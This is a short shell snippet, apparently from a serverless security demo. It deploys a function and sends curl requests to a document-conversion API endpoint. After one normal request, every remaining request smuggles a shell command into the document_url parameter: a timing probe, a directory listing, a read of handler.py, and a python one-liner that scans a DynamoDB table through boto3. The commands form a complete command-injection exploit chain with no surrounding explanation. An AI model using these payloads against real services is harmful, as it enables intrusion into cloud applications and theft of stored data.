```
sls deploy
curl -G https://API_GATEWAY_URL/dev/convert --data-urlencode "document_url=www.snee.com/xml/xslt/sample.doc"
curl -G https://API_GATEWAY_URL/dev/convert --data-urlencode "document_url=; sleep 10 #"
curl -G https://API_GATEWAY_URL/dev/convert --data-urlencode "document_url=; ls #"
curl -G https://API_GATEWAY_URL/dev/convert --data-urlencode "document_url=; cat handler.py #"
curl -G https://API_GATEWAY_URL/dev/convert --data-urlencode "document_url=; python -c 'import boto3, os; print boto3.client(\"dynamodb\").scan(TableName=os.environ[\"TABLE_NAME\"])' #"
```
